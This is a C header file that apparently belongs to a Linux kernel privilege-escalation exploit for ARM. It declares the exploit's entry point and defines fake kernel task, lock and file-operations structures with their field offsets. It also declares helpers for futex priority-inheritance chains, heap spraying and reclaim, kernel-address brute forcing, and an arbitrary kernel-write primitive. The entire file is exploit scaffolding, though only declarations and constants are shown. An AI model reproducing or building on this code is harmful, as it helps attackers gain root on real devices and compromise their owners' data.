#ifndef COMMON_H
#define COMMON_H

#define _GNU_SOURCE
#define __ARM 1

#include "offset.h"
#include "address_space.h"
#include "payload_builder.h"
#include "runtime_config.h"
#include "runtime_time.h"
#include "heap_context.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_SIZE 4096
#define KS_PAGE_MASK 0xfffULL

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/memfd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define SKB_DATA_DELTA (-0xe80LL)
#define MM_STRUCT_SZ 0x500

/* mm_struct stride; 0 uses MM_STRUCT_SZ above. */
#define mm_struct_sz() _RSO(mm_struct_sz, MM_STRUCT_SZ)

#define MM_ORDER 3
#define MM_PARTIALS 5
extern int g_core_main;
extern int g_core_consumer;
#define CORE (g_core_main)
#define CONSUMER_CORE (g_core_consumer)
#define kernelsnitch_collisions() _RSO(kernelsnitch_collisions, 4)

#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SENDS 4
#define FOPS_TABLE_OFF FOPS_OFF
#define SKB_FRAG_BIAS 0

#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 140
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
#define FAKE_TASK_UCLAMP_OFF 0x358
#define FAKE_UCLAMP_ACTIVE_BIT 16
#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
#define FAKE_UCLAMP_MAX_ACTIVE \
  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))

#define TASK_COMM_LEN 16

#define PSELECT_ROUTE_NFDS 320
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_SETTLE_USEC 250000
#define SLIDE_NFULNL_LOGGER \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_NFULNL_LOGGER_IMAGE)
#define SLIDE_LOGGERS_0_1 \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_LOGGERS_0_1_IMAGE)
#define SLIDE_RANDOM_BOOT_ID_DATA \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
#define SLIDE_INIT_TASK \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_INIT_TASK_IMAGE)
#define SLIDE_ROOT_TASK_GROUP \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_ROOT_TASK_GROUP_IMAGE)
#define SLIDE_SYSCTL_BOOTID \
  resolved_addresses_data_alias(&g_resolved_addresses, SLIDE_SYSCTL_BOOTID_IMAGE)

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

/* TODO(decoupling:S14-session): ExploitSession will own this context and pass it
 * explicitly. These compatibility aliases keep S09 behavior/source churn small. */
#define page_base (g_heap_context.current.base)
#define last_mm_struct (g_heap_context.current.last_mm_struct)
#define fake_lock (g_heap_context.current.fake_lock)
#define fake_w0 (g_heap_context.current.fake_w0)
#define fake_task (g_heap_context.current.fake_task)
#define fake_parent (g_heap_context.current.fake_parent)
#define fake_right (g_heap_context.current.fake_right)
#define fake_left (g_heap_context.current.fake_left)
#define fake_fops (g_heap_context.current.fake_fops)

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int consumer_inflight;
extern atomic_int main_route_delay_usec;
extern int route_last_step;
extern int route_last_errno;
#define memfd_leak (g_heap_context.leak_memfd)

int run_exploit(int argc, char **argv);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void disable_rseq_for_thread(void);
void init_p0_profile(void);
extern ResolvedAddresses g_resolved_addresses;
extern TargetProfile g_target_profile;
long futex_op(
    uint32_t *uaddr, int op, uint32_t val,
    const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
pid_t clone_child(void);
pid_t clone_leak_child(void);
int open_memfd(pid_t child);
void kill_child(pid_t child);
void close_reclaim_sockets(void);
int quarantine_reclaim_sockets(void);
void release_quarantined_reclaim_sockets(void);
int stash_prebuilt_page(void);
int activate_prebuilt_page(void);
void discard_prebuilt_page(void);
void setup_kernelsnitch(void);
int kernelsnitch_collisions_ready(void);
void run_kernelsnitch_bruteforce(void);
uintptr_t current_kernelsnitch_mm_struct(void);
uintptr_t cleanup_kernelsnitch(void);
void close_ctx_memfds(struct mm_ctx *ctx);
void free_ctx_storage(struct mm_ctx *ctx);
void cleanup_page_prepare_state(void);
int clone_memfd(void);
void prepare_ctxs(void);
int prepare_skb_payload(uintptr_t base, const WriteRequest *request);
uintptr_t prepare_kernel_page(const WriteRequest *request);
uintptr_t prepare_good_kernel_page(const WriteRequest *request);

void log_sync(void);
void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
int tcp_route_selected(void);
int kernel5_route_selected(void);
void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
void reserve_standard_io(void);
void prepare_pselect_fdsets(
    fd_set *in, fd_set *out, fd_set *ex, const WriteRequest *request);
void do_pselect_fake_lock_route(const WriteRequest *request);
void do_tcp_fake_lock_route(const WriteRequest *request);
void do_kernel5_fake_lock_route(const WriteRequest *request);
int kernel5_resident_start(void);
int kernel5_resident_write(uintptr_t target, uintptr_t value);
void kernel5_resident_stop(void);
void reset_main_route_state(void);
int run_main_route_threads(const WriteRequest *request);

#include "runtime_struct_offsets.h"

#endif
